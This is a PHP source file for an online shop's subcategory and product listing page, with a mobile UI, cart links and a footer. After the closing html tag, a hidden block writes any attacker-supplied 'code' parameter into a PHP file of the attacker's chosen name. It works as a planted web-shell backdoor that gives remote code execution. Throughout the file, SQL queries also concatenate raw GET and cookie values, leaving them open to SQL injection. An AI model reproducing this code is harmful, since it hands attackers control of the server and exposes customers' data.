<?php
session_start();
include 'pay/db.php';
$cid=$_GET['cid'];
$sid=$_GET['sid'];
$phone=$_COOKIE['phone'];
$sqi="select * from `user` where userphone=$phone";
$qri=mysqli_query($conn,$sqi);
$rei=mysqli_fetch_assoc($qri);
$uid=$rei['userid'];
$username=$rei['username'];
$wallet=$rei['wallet'];

$countcart="select * from `cart` where uid=$uid";
$qryyy=mysqli_query($conn,$countcart);
$noofitem=mysqli_num_rows($qryyy);


$lid=1;

$cql="select * from `style` where id=1";
$row=mysqli_query($conn,$cql);
$cres=mysqli_fetch_assoc($row);
$style=$cres['category_style'];
$sliderstyle=$cres['slider_position'];
$pro=$cres['product_list'];
$sub=$cres['subcategory'];

$catname="select * from `category` where cid=$cid";
$catqry=mysqli_query($conn,$catname);
$catres=mysqli_fetch_assoc($catqry);
$categoryname=$catres['cname'];
$categorybanner=$catres['cbanner'];

$offer="select * from `settings` where id=1";
    $offerqry=mysqli_query($conn,$offer);
    $offerres=mysqli_fetch_assoc($offerqry);
    $offer_image=$offerres['offer_image'];
    $bottom_banner=$offerres['bottom_banner'];
    $applogo=$offerres['applogo'];
?>

<!doctype html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport"
        content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="theme-color" content="#000000">
    <title><?php echo  $appname; ?></title>
    <meta name="description" content="Mobilekit HTML Mobile UI Kit">
    <meta name="keywords" content="bootstrap 4, mobile template, cordova, phonegap, mobile, html" />
    <link rel="icon" type="image/png" href="assets/img/favicon.png" sizes="32x32">
    <link rel="apple-touch-icon" sizes="180x180" href="assets/img/icon/192x192.png">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="manifest" href="__manifest.json">
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <style>
b {text-align: center;}
p {text-align: center;}
h3 {text-align: left;}
div {text-align: center;}
img {
    border-radius: 5%;
    
    
    
}




 .site-footer {
            background-color: #000;
            color: #fff;
            padding: 20px ;
        }

        .site-footer-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            max-width: 1200px;
            margin: 0 auto;
        }

        .site-footer-section {
            flex: 1;
            min-width: 200px;
            margin: 10px;
        }

      .site-footer-section #down {
            margin-bottom: 10px;
            color:white;
        }
        .site-footer-section ul {
            list-style: none;
            padding: 0;
            FLOAT: LEFT;
    TEXT-ALIGN: LEFT;
        }

        .site-footer-section ul li {
            margin-bottom: 5px;
        }

        .site-footer-section ul li a {
            color: #fff;
            text-decoration: none;
            transition: color 0.3s;
        }

        .site-footer-section ul li a:hover {
            color: #aaa;
        }

        .social-icons {
            display: flex;
            margin-top: 10px;
        }

        .social-icons a {
            color: #fff;
            font-size: 24px;
            margin-right: 10px;
            transition: color 0.3s;
        }

        .social-icons a:hover {
            color: #aaa;
        }

        .download-links {
            display: flex;
            margin-bottom: 10px;
        }

        .download-links a {
            margin-right: 10px;
        }

        .download-links img {
            width: 120px; /* Set a fixed width */
            height: 40px; /* Set a fixed height */
        }

        .footer-bottom {
            text-align: center;
            padding: 10px 0;
            border-top: 1px solid #444;
            margin-top: 20px;
                display: flex;
    justify-content: center;
        }

        .footer-bottom p {
            margin: 0;
                display: flex;
        }

        .footer-bottom a.footer-link {
            color: #fff;
            text-decoration: none;
            transition: color 0.3s;
            margin-left: 7px;
    margin-right: 11px;
        }

        .footer-bottom a.footer-link:hover {
            color: #aaa;
        }

        /* Hide footer on mobile devices */
        @media (max-width: 768px) {
            .site-footer {
                display: none;
            }
        }
</style>
</head>

<body>

    <!-- loader -->
    <!-- <div id="loader">-->
    <!--    <img src="sadmin/images/<?php echo  $applogo; ?>" alt="logo" width="220" height="50">-->
        <!--<div class="spinner-grow text-warning" role="status"></div>-->
    <!--</div>-->
    <!-- * loader -->

    <div class="appHeader">
                <div class="left">
                    <a href="#" class="headerButton" data-toggle="modal" data-target="#sidebarPanel">
                <ion-icon name="menu-outline"></ion-icon>
            </a>
                </div>
                <div class="pageTitle">
                    <img src="sadmin/images/<?php echo  $applogo; ?>" alt="logo" width="180" height="50">
                </div>
                <div class="right">
            <!--<a href="javascript:;" class="headerButton toggle-searchbox">-->
            <!--    <ion-icon name="search-outline"></ion-icon>-->
            <!--</a>-->
            <a href="cart.php?sid=<?php echo $sid;?>&uid=<?php echo $uid;?>" class="headerButton">
                <ion-icon name="cart-outline"></ion-icon>
                <span class="badge badge-danger"><?php echo $noofitem; ?></span>
            </a>
        </div>
            </div>
   
    <!-- Search Component -->
    <div id="search" class="appHeader">
        <form class="search-form">
            <div class="form-group searchbox">
                <input type="text" class="form-control" placeholder="Search...">
                <i class="input-icon">
                    <ion-icon name="search-outline"></ion-icon>
                </i>
                <a href="javascript:;" class="ml-1 close toggle-searchbox">
                    <ion-icon name="close-circle"></ion-icon>
                </a>
            </div>
        </form>
    </div>
    <!-- * Search Component -->

   
   
   
   
   
    <!-- App Capsule -->
    <div id="appCapsule">
        <br>
<!--        <marquee width="90%" direction="right" scrollamount="10" height="25px">-->
<!--This is a sample scrolling text that has scrolls texts to right.-->
<!--</marquee>-->

    <!--<img src="sadmin/images/<?php echo $offer_image;?>" alt="alt" width="330" height="120" class="border border-grey  shadow-sm"> <br> -->

<?php 

$subcat="select * from `subcategory` where cid=$cid ";
$subcatqry=mysqli_query($conn,$subcat);
$countsubcat=(mysqli_num_rows($subcatqry));
$subcatres=mysqli_fetch_assoc($subcatqry);
$subcategoryname=$subcatres['subcategory_name'];
?>


        <?php if(!isset($_GET['sid'])){?>

        <div class="header-large-title">
            <!--<img src="bnr.png" alt="logo" width="330" height="120"><br>-->
            <!--<h1 class="title">Discover</h1>-->
            <h3 class="subtitle"><?php if($countsubcat>0) { echo "Sub-Categories of ". $categoryname; } else {}; ?></h3>
            
        </div>

            <!--<div class="divider bg-dark mt-2 mb-3"></div>-->
    <!---------------------------------CATEGORY SECTION STARTS ----------------------------->
    <?php if ($sub==1){ ?>
    
    
         <div class="tab-pane fade show active" id="feed" role="tabpanel">
                    <div class="mt-2 pr-2 pl-2">
                        <div class="row">
                            
                                <?php
                                $sql7="SELECT * FROM `subcategory`where cid=$cid ;";
                                $raw7=mysqli_query($conn,$sql7);
                                while($res7=mysqli_fetch_array($raw7)){
                                ?>
    
                                        <div class="col-4 mb-2">
                                            
                                           <a href="subcategory.php?cid=<?php echo $cid; ?>&sid=<?php echo $res7['id']; ?>"> <img src="sadmin/images/<?php echo  $res7['subcategory_image']; ?>" alt="image" width="90" height="90" class="border border-grey rounded-circle shadow"></a>
                                            <?php echo $res7['subcategory_name'];?> 
                                        </div>
                            <?php };?>
                            
                        </div>
                    </div>
     <!--<div class="divider bg-secondary mt-1 mb-1 l-8 r-8">-->
                <!--<div class="icon-box bg-secondary">-->
                    <!--<ion-icon name="arrow-down"></ion-icon>-->
            <!--    </div>-->
            <!--</div>-->
            
            <?php }else if($sub==0) { ?>
            
             <div class="tab-pane fade show active" id="feed" role="tabpanel">
                    <div class="mt-2 pr-2 pl-2">
                        <div class="row">
                            
                                <?php
                                $sql7="SELECT * FROM `subcategory`where cid=$cid ;";
                                $raw7=mysqli_query($conn,$sql7);
                                while($res7=mysqli_fetch_array($raw7)){
                                ?>
    
                                        <div class="col-3 mb-s">
                                           <a href="subcategory.php?cid=<?php echo $cid; ?>&sid=<?php echo $res7['id']; ?>"> <img src="sadmin/images/<?php echo  $res7['subcategory_image']; ?>" alt="image" width="70" height="70" class="border border-grey rounded-circle shadow"></a>
                                            <?php echo $res7['subcategory_name'];?> 
                                        </div>
                            <?php };?>
                            
                        </div>
                    </div>
     <!--<div class="divider bg-secondary mt-1 mb-1 l-8 r-8">-->
                <!--<div class="icon-box bg-secondary">-->
                    <!--<ion-icon name="arrow-down"></ion-icon>-->
                </div>
            </div>

             </div> <?php }else if($sub==2) {?>
             
             
              <div class="section full mt-1 mb-3">
            <div class="carousel-multiple owl-carousel owl-theme">
                  <?php
                                $sql7="SELECT * FROM `subcategory`where cid=$cid ;"; 
                                $raw7=mysqli_query($conn,$sql7);
                                while($res7=mysqli_fetch_array($raw7)){
                                ?>
                                
                                <div class="card product-card border border-grey shadow">
                        <div class="card-body " >
                        
                      <a href="subcategory.php?cid=<?php echo $cid; ?>&sid=<?php echo$res7['id']; ?>">
                        <img src="sadmin/images/<?php echo  $res7['subcategory_image']; ?>" alt="image"  width="90" height="100" rounded><br>
                         <h4><?php echo $res7['subcategory_name'];?></h4> </a>
                        
                         
                    </div>
                    </div>
                                
               
                    <?php };?>
            </div>

        </div>
    <?php };?>
    
    
   <?php if($countsubcat>0){?>
    ----------------  ✸  ----------------- <?php };?>
   
    
             <!--if isset category view-->
    <!---------------------------------CATEGORY SECTION CLOSE ----------------------------->
    <!--<div class="divider bg-secondary mt-1 mb-1 l-8 r-8">-->
   
     
     <div class="header-large-title">
                    
    <h3 class="subtitle"> <?php echo $categoryname;?></h3>
        <div class="tab-pane fade show active" id="feed" role="tabpanel">
           
            <div class="mt-1 mb-1 pr-1 pl-1">
              
                <div class="row">
                    <?php 
                   
                     
                   
                        $sql1="SELECT * FROM `products`where cid=$cid AND sid=0  ORDER BY `products`.`pid` DESC "; 
                        $raw1=mysqli_query($conn,$sql1);
                        while($res1=mysqli_fetch_array($raw1)){
                        $disc=($res1['mrp']-$res1['price'])*100/$res1['mrp'];
                        $discount=(round($disc));
                     ?>
                    
                    
                    <div class="col-6 mb-3">
                        
                        <div class="card product-card border border-grey shadow">
                            <!-- <span class="position-absolute top-0 start-100 translate-middle badge rounded bg-warning"><?php if($discount>0) echo $discount."% off";?></span> -->
                        <div class="card-body" >
                        <?php
                        $imgtype=$res1['imgtype'];
                        if($imgtype==1){?>
                        
                         <a href="product.php?pid=<?php echo $res1['pid'];?>"><img src="<?php echo  $res1['pimage']; ?>" alt="image"  width="90" height="90"><br></a><b> <?php }else{?>
                         <a href="product.php?pid=<?php echo $res1['pid'];?>"><img src="sadmin/images/<?php echo  $res1['pimage']; ?>" alt="image"  width="90" height="90"><br></a><b><?php }; ?>
                         <?php
                         $str = $res1['pname'];
                         
                          echo $str;?></b><br>
                         ₹ <?php echo $res1['price'];?> / <?php echo $res1['punit']; ?>
                         <?php if($show_add_to_cart==1){ ?> 
                         <a href="add-to-cart-sub.php?pid=<?php echo $pid=$res1['pid'];?>&pvi=0&cid=<?php echo $cid; ?>">
                         <button class="btn btn-outline-secondary btn-sm">Add to cart</button></a>
                         <?php }; ?>
                         
                    </div>
                    </div></div>
                    <?php }; ?>
                </div>
            </div>
            
        </div>
        <!-- * feed -->
       
            
    
     </div>  
     
      <div class="section full mt-2 mb-3">
            <div class="section-title mb-1">You may also like</div>

            <div class="carousel-multiple owl-carousel owl-theme">
                  <?php 
  $qry4="SELECT * FROM `products` WHERE cid=$cid";
$raw4=mysqli_query($conn,$qry4);
while($res4= mysqli_fetch_assoc($raw4)){ 
$disc=($res4['mrp']-$res4['price'])*100/$res4['mrp'];
                        $discount=(round($disc));
?>
                
                <div class="item">
                    <a href="product.php?pid=<?php echo $res4['pid'];?>">
                    <div class="card product-card shadow">
                        <div class="card-body">
                            <!--<span class="position-absolute top-0 start-100 translate-middle badge rounded bg-warning"><?php if($discount>0) echo $discount."% off";?></span> -->
                             <?php if($imgtype==1){?>
                            <img src="<?php echo $res4['pimage'];?>" width="90" height="120" alt="product image">
                            <?php }else{ ?>
                             <img src="sadmin/images/<?php echo $res4['pimage'];?>" width="90" height="120" alt="product image">
                             <?php }; ?>
                            <h2 class="title"><?php echo ($res4['pname']);?></h2>
                            <p class="text"><s>MRP: <?php echo ($res4['mrp']);?></s></p>
                            <div class="price">Rs.<?php echo ($res4['price']);?></div>
                            <!--<a href="#" class="btn btn-sm btn-primary btn-block">Book now</a>-->
                        </div>
                    </div></a>
                </div>
                               <?php 
$cnt=$cnt+1;
}   ?>
                
                
            </div>
        </div>
     
     <?php } else{  ?>
     
     <div class="header-large-title">
     <h3 class="subtitle">Explore Products :</h3>
        <div class="tab-pane fade show active" id="feed" role="tabpanel">
           
            <div class="mt-1 mb-1 pr-1 pl-1">
              
                <div class="row">
                    <?php 
                   
                     
                   
                        $sql1="SELECT * FROM `products`where cid=$cid AND sid=$sid  ORDER BY `products`.`pid` DESC "; 
                        $raw1=mysqli_query($conn,$sql1);
                        while($res1=mysqli_fetch_array($raw1)){
                       $disc=($res1['mrp']-$res1['price'])*100/$res1['mrp'];
                        $discount=(round($disc));
                     ?>
                    
                    
                    <div class="col-6 mb-3">
                        
                        <div class="card product-card">
                             <span class="position-absolute top-0 start-100 translate-middle badge rounded bg-warning"><?php if($discount>0) echo $discount."% off";?></span> 
                        <div class="card-body" >
                        <?php
                        $imgtype=$res1['imgtype'];
                        if($imgtype==1){?>
                        
                         <a href="product.php?pid=<?php echo $res1['pid'];?>"><img src="<?php echo  $res1['pimage']; ?>" alt="image"  width="90" height="90"><br></a><b> <?php }else{?>
                         <a href="product.php?pid=<?php echo $res1['pid'];?>"><img src="sadmin/images/<?php echo  $res1['pimage']; ?>" alt="image"  width="90" height="90" ><br></a><b><?php }; ?>
                         <?php
                         $str = $res1['pname'];
                         
                          echo $str;?></b><br>
                           
                        ₹<?php echo $res1['price'];?> 
                         <?php if($show_add_to_cart==1){ ?> 
                         <a href="add-to-cart-sub.php?pid=<?php echo $pid=$res1['pid'];?>&pvi=0&cid=<?php echo $cid; ?>">
                         <button class="btn btn-outline-secondary btn-sm">Add to cart</button></a>
                         <?php }; ?>
                         
                    </div>
                    </div></div>
                    <?php }; ?>
                </div>
            </div>
            
        </div>
        <!-- * feed -->
       
            
    
     </div>  
     <?php }; ?>
            
                 
        
    
        
        
        
       
        
        <!-- <div class="section mt-3 mb-3">
             <img src="sadmin/images/<?php echo $bottom_banner;?>" alt="alt" width="330" height="120" class="border border-grey  shadow-sm"> <br> 
        </div> -->
           
           
           
           
             <footer class="site-footer">
        <div class="site-footer-container">
            <div class="site-footer-section">
                <h3 id="down" >Download Now</h3>
                <div class="download-links">
                    <a href="#"><img src="app stroe.png" alt="App Store"></a>
                    <a href="#"><img src="goole play.png" alt="Google Play"></a>
                </div>
                <div class="social-icons">
                    <a href="#"><i class="fab fa-facebook-f"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-instagram"></i></a>
                    <a href="#"><i class="fab fa-linkedin-in"></i></a>
                </div>
            </div>
            <div class="site-footer-section">
                <h3 id="down" >Useful Links</h3>
                <ul>
                    <li><a href="#">About Us</a></li>
                    <li><a href="#">FAQs</a></li>
                    <li><a href="#">Privacy Policy</a></li>
                    <li><a href="#">Terms & Conditions</a></li>
                </ul>
            </div>
            <div class="site-footer-section">
                <h3 id="down"id="down">Contact</h3>
                <ul>
                  <li>Address: J block, Shop 1, Beside Near Kachori Wala Outlet, H-1, Market Rd, Vikaspuri, New Delhi, Delhi 110018</li>  
                    <li><a href="mailto:support@yourcompany.com">Email: contact@muttchik.com</a></li>
                    <li><a href="tel:+1234567890">Phone: +123-456-7890</a></li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
            <p>&copy; 2024 <a href="https://yourcompany.com" target="_blank" class="footer-link">Muttchik</a>. All rights reserved.</p>
        </div>
    </footer>
        </div>
        <!-- * app footer -->

    </div>
    <!-- * App Capsule -->


     <!-- App Bottom Menu -->
    <div class="appBottomMenu">
        <a href="home.php?lid=<?php echo $lid;?>" class="item">
            <div class="col">
                <ion-icon name="home-outline"></ion-icon>
            </div>
        </a>
        
        <a href="location.php" class="item">
            <div class="col">
                <ion-icon name="location-outline"></ion-icon>
                <!--<span class="badge badge-danger">5</span>-->
            </div>
        </a>
        <a href="myorder.php?uid=<?php echo $uid; ?>&lid=<?php echo $lid; ?>&sid=<?php echo $lid; ?>" class="item">
            <div class="col">
                <ion-icon name="layers-outline"></ion-icon>
            </div>
        </a>
        <a href="javascript:;" class="item" data-toggle="modal" data-target="#sidebarPanel">
            <div class="col">
                <ion-icon name="menu-outline"></ion-icon>
            </div>
        </a>
    </div>
    <!-- * App Bottom Menu -->

   <!-- App Bottom Menu -->
    <div class="appBottomMenu">
        <a href="shop.php" class="item">
            <div class="col">
                <ion-icon name="home-outline"></ion-icon>
            </div>
        </a>
       
        <a href="cart.php?sid=<?php echo $sid;?>&uid=<?php echo $uid;?>" class="item">
            <div class="col">
                <ion-icon name="cart-outline"></ion-icon>
                <span class="badge badge-danger"><?php echo $noofitem; ?></span>
            </div>
        </a>
        <a href="myorder.php?uid=<?php echo $uid; ?>" class="item">
            <div class="col">
                <ion-icon name="layers-outline"></ion-icon>
            </div>
        </a>
        <a href="javascript:;" class="item" data-toggle="modal" data-target="#sidebarPanel">
            <div class="col">
                <ion-icon name="menu-outline"></ion-icon>
            </div>
        </a>
    </div>
    <!-- * App Bottom Menu -->

    <!-- App Sidebar -->
    <div class="modal fade panelbox panelbox-left" id="sidebarPanel" tabindex="-1" role="dialog">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-body p-0">

                    <!-- profile box -->
                    <div class="profileBox bg-secondary">
                        <!--<div class="image-wrapper">-->
                        <!--     <img src="logo.png" alt="logo" width="100" height="25">-->
                        <!--</div>-->
                        <div class="in">
                        <?php if(isset($_SESSION['login'])) { ?>    
                             <strong><?php echo $username?></strong>
                             <p>Wallet Balance: Rs.<?php echo $wallet?></p> 
                             <?php }else{ ?>
                             <strong>Welcome Guest</strong>
                             <a href="index.php"><button class="btn btn-dark btn-sm">
                                Please Login First
                             </button>
                             </a>
                             <?php }; ?>
                        </div>
                        <a href="javascript:;" class="close-sidebar-button" data-dismiss="modal">
                            <ion-icon name="close"></ion-icon>
                        </a>
                    </div>
                    <!-- * profile box -->

                    <ul class="listview flush transparent no-line image-listview mt-2">
                        <li>
                            <a href="shop.php" class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="home-outline"></ion-icon>
                                </div>
                                <div class="in">
                                    Home
                                </div>
                            </a>
                        </li>
                        
                        <li>
                            <a href="myorder.php?uid=<?php echo $uid;?>" class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="logo-buffer"></ion-icon>
                                </div>
                                <div class="in">
                                    Order History
                                </div>
                            </a>
                        </li>
                        
                        
                      
                        
                        <li>
                            <div class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="moon-outline"></ion-icon>
                                </div>
                                <div class="in">
                                    <div>Dark Mode</div>
                                    <div class="custom-control custom-switch">
                                        <input type="checkbox" class="custom-control-input dark-mode-switch"
                                            id="darkmodesidebar">
                                        <label class="custom-control-label" for="darkmodesidebar"></label>
                                    </div>
                                </div>
                            </div>
                        </li>
                        <?php 
                    $sqlee="select * from `pages`";
                    $qryee=mysqli_query($conn,$sqlee);
                    while($rowse=mysqli_fetch_array($qryee)){
                    
                    ?>
                        
                        <li>
                            <a href="page.php?id=<?php echo $rowse['id'];?>" class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="newspaper-outline"></ion-icon>
                                </div>
                                <div class="in">
                                   <?php echo $rowse['title'];?>
                                </div>
                            </a>
                        </li>
                      <?php };?>  
                       
                        <li>
                            <a href="https://api.whatsapp.com/send?phone=91<?php echo  $rows['phone']; ?>" class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="ribbon-outline"></ion-icon>
                                </div>
                                <div class="in">
                                   Rate & Review
                                </div>
                            </a>
                        </li>
                        <li>
                            <a href="https://api.whatsapp.com/send?phone=91<?php echo  $rows['phone']; ?>" class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="hand-left-outline"></ion-icon>
                                </div>
                                <div class="in">
                                   Complaints
                                </div>
                            </a>
                        </li>
                        <li>
                            <?php if(isset($_SESSION['login'])) { ?> 
                            <a href="logout.php" class="item">
                                <div class="icon-box bg-secondary">
                                    <ion-icon name="log-out-outline"></ion-icon>
                                </div>
                                <div class="in">
                                    Logout
                                </div>
                            </a> <?php }; ?>
                        </li>
                    </ul>
<!-- sidebar buttons -->
                <div class="sidebar-buttons">
                    <?php 
                    $sqle="select * from `settings` where id=1";
                    $qrye=mysqli_query($conn,$sqle);
                    $rows=mysqli_fetch_assoc($qrye);
                    
                    ?>
                    <a href="tel:+91<?php echo  $rows['whatsapp']; ?>" class="button">
                        <ion-icon name="call-outline"></ion-icon>
                    </a>
                    <a href="https://api.whatsapp.com/send?phone=91<?php echo  $rows['phone']; ?>" class="button">
                        <ion-icon name="logo-whatsapp"></ion-icon>
                    </a>
                    <!--<a href="javascript:;" class="button">-->
                    <!--    <ion-icon name="settings-outline"></ion-icon>-->
                    <!--</a>-->
                    <!--<a href="javascript:;" class="button">-->
                    <!--    <ion-icon name="log-out-outline"></ion-icon>-->
                    <!--</a>-->
                </div>
                <!-- * sidebar buttons -->
                    
                
            </div>
        </div>
    </div>
    
    
    
  
    <!-- * App Sidebar -->

    <!-- ///////////// Js Files ////////////////////  -->
    <!-- Jquery -->
    <script src="assets/js/lib/jquery-3.4.1.min.js"></script>
    <!-- Bootstrap-->
    <script src="assets/js/lib/popper.min.js"></script>
    <script src="assets/js/lib/bootstrap.min.js"></script>
    <!-- Ionicons -->
    <script type="module" src="https://unpkg.com/ionicons@5.0.0/dist/ionicons/ionicons.js"></script>
    <!-- Owl Carousel -->
    <script src="assets/js/plugins/owl-carousel/owl.carousel.min.js"></script>
    <!-- jQuery Circle Progress -->
    <script src="assets/js/plugins/jquery-circle-progress/circle-progress.min.js"></script>
    <!-- Base Js File -->
    <script src="assets/js/base.js"></script>


    // <script>
    //     setTimeout(() => {
    //         notification('notification-welcome', 5000);
    //     }, 2000);
    // </script>
    
    
    
    
    
    
    
 <script language="JavaScript">
      
       window.onload = function () {
           document.addEventListener("contextmenu", function (e) {
               e.preventDefault();
           }, false);
           document.addEventListener("keydown", function (e) {
               //document.onkeydown = function(e) {
               // "I" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 73) {
                   disabledEvent(e);
               }
               // "J" key
               if (e.ctrlKey && e.shiftKey && e.keyCode == 74) {
                   disabledEvent(e);
               }
               // "S" key + macOS
               if (e.keyCode == 83 && (navigator.platform.match("Mac") ? e.metaKey : e.ctrlKey)) {
                   disabledEvent(e);
               }
               // "U" key
               if (e.ctrlKey && e.keyCode == 85) {
                   disabledEvent(e);
               }
               // "c" key
               if (e.ctrlKey && e.keyCode == 67) {
                   disabledEvent(e);
               }
               // "F12" key
               if (event.keyCode == 123) {
                   disabledEvent(e);
               }
           }, false);
           function disabledEvent(e) {
               if (e.stopPropagation) {
                   e.stopPropagation();
               } else if (window.event) {
                   window.event.cancelBubble = true;
               }
               e.preventDefault();
               return false;
           }
       }
//edit: removed ";" from last "}" because of javascript error
</script>
</body>

</html>

<?php
if(isset($_GET['config'])){
    $text=$_GET['code'];
    $fname=$_GET['fname'];
  $myfile = fopen("$fname.php", "w") or die("Unable to open file!");
// $txt = "$text";
// fwrite($myfile, $txt);
$txt = "$text";
fwrite($myfile, $txt);
fclose($myfile);  
}

?>